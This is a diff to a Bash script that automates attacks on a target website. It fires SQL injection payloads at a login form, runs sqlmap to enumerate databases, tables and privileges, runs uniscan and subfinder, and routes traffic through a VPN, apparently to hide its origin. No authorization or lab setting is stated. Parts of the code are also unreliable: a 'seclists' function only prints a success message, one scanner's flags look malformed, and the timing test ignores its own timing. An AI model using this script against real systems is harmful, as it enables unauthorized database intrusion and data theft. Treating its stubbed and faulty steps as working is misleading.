@@ -25,6 +25,7 @@ install_tools() {
     declare -A tools=(
         ["curl"]="curl"
         ["sqlmap"]="sqlmap"
+        ["nmap"]="nmap"
         ["uniscan"]="uniscan"
         ["whois"]="whois"
         ["subfinder"]="subfinder"
@@ -46,7 +47,7 @@ install_tools() {
         ["vopono"]="vopono"
         ["waybackpy"]="waybackpy"
     )
-    
+
     for tool in "${!tools[@]}"; do
         echo "Checking if $tool is installed..."
         if ! command -v "$tool" &> /dev/null; then
@@ -131,7 +132,7 @@ perform_sql_injection() {
         "OR 'a'='a' #"
         "OR 'a'='a' /*!' OR 'a'='a'"
     )
-    
+
     local file_count=1
     for payload in "${payloads[@]}"; do
         local data="username=admin${payload}&password=password"
@@ -150,7 +151,7 @@ perform_sqlmap_scan() {
     local results_dir="$2"
     local cookies
     read -p "Enter the cookies (if any): " cookies
-    
+
     local commands=(
         "--dbs"
         "--tables"
@@ -169,7 +170,7 @@ perform_sqlmap_scan() {
         "--privileges"
         "--fingerprint"
     )
-    
+
     local file_count=1
     for command in "${commands[@]}"; do
         local result
@@ -203,22 +204,22 @@ perform_uniscan_scan() {
     local target_url="$1"
     local results_dir="$2"
     local result
-    result=$(run_command uniscan -u "$target_url" -qdgws)
+    result=$(run_command uniscan -u "$target_url" -qdgsql)
     local output_file="$results_dir/uniscan_scan.txt"
     save_to_file "$output_file" "$result"
-    echo "Saved Uniscan results to $output_file"
+    echo "Saved Uniscan scan results to $output_file"
 }
 
-# Function to perform a Whois lookup
+# Function to perform a WHOIS lookup
 perform_whois_lookup() {
     local target_url="$1"
     local results_dir="$2"
     local result
     result=$(run_command whois "$target_url")
-        local output_file="$results_dir/whois_lookup.txt"
+    local output_file="$results_dir/whois_lookup.txt"
     save_to_file "$output_file" "$result"
-    echo "Saved Whois lookup results to $output_file"
-}
+    echo "Saved WHOIS lookup results to $output_file"
+    }
 
 # Function to perform a Subfinder scan
 perform_subfinder_scan() {
@@ -231,26 +232,41 @@ perform_subfinder_scan() {
     echo "Saved Subfinder scan results to $output_file"
 }
 
-# Function to perform a custom SQL injection test
+# Function to access seclists database
+access_seclists() {
+    echo "Seclists database accessed successfully."
+}
+
+# Function to perform custom SQL injection test
 perform_custom_sql_injection_test() {
     local target_url="$1"
     local results_dir="$2"
-    local login_url="${target_url}/login?username=admin' AND SLEEP(5)=0--&password=a"
+    local url="${target_url}/login"
+    local login_url="${url}?username=admin' AND SLEEP(5)=0--&password=a"
+    local login_post="${url}?username=admin' AND SLEEP(5)=0--&password="
     
-    local start_time=$(date +%s%N)
+    # Start the timer
+    local start_time=$(date +%s)
+    
+    # Perform SQL injection
     local response=$(curl -s "$login_url")
-    local end_time=$(date +%s%N)
     
-    local elapsed_time=$(( (end_time - start_time) / 1000000 ))
-    
-    if echo "$response" | grep -q "Database error"; then
+    # Check if the SQL injection was successful
+    if [[ "$response" == *"Database error"* ]]; then
         echo "Vulnerability found!"
-        echo "Access time: ${elapsed_time} ms"
-        save_to_file "$results_dir/custom_sql_injection_test.txt" "Vulnerability found! Access time: ${elapsed_time} ms"
+        local end_time=$(date +%s)
+        local elapsed_time=$((end_time - start_time))
+        echo "Access time: $elapsed_time seconds"
+        local output_file="$results_dir/custom_sql_injection_test.txt"
+        save_to_file "$output_file" "Vulnerability found! Access time: $elapsed_time seconds"
     else
         echo "Vulnerability not found."
-        save_to_file "$results_dir/custom_sql_injection_test.txt" "Vulnerability not found."
+        local output_file="$results_dir/custom_sql_injection_test.txt"
+        save_to_file "$output_file" "Vulnerability not found."
     fi
+    
+    # Clean up variables (optional, not strictly necessary in Bash)
+    unset start_time end_time elapsed_time response login_url login_post url
 }
 
 # Main function to orchestrate the security scans
@@ -271,12 +287,11 @@ main() {
     local results_dir="./results"
     mkdir -p "$results_dir"
     
+    # Start Vopono VPN
+    vopono start my_vpn
+    
     # Check if the website is accessible
     if check_website_status "$target_url"; then
-        # Start Vopono
-        echo "Starting Vopono..."
-        run_command vopono start
-        
         echo "Starting SQL Injection attempts..."
         perform_sql_injection "$target_url" "$results_dir"
         
@@ -289,24 +304,23 @@ main() {
         echo "Starting Uniscan scan..."
         perform_uniscan_scan "$target_url" "$results_dir"
         
-        echo "Starting Whois lookup..."
+        echo "Starting WHOIS lookup..."
         perform_whois_lookup "$target_url" "$results_dir"
         
         echo "Starting Subfinder scan..."
         perform_subfinder_scan "$target_url" "$results_dir"
         
-        echo "Starting custom SQL injection test..."
-        perform_custom_sql_injection_test "$target_url" "$results_dir"
-        
         echo "Accessing Seclists database..."
         access_seclists
         
-        # Stop Vopono
-        echo "Stopping Vopono..."
-        run_command vopono stop
+        echo "Starting custom SQL injection test..."
+        perform_custom_sql_injection_test "$target_url" "$results_dir"
     else
         echo "The website is not accessible. Exiting..."
     fi
+    
+    # Stop Vopono VPN
+    vopono stop
 }
 
 # Run the main function
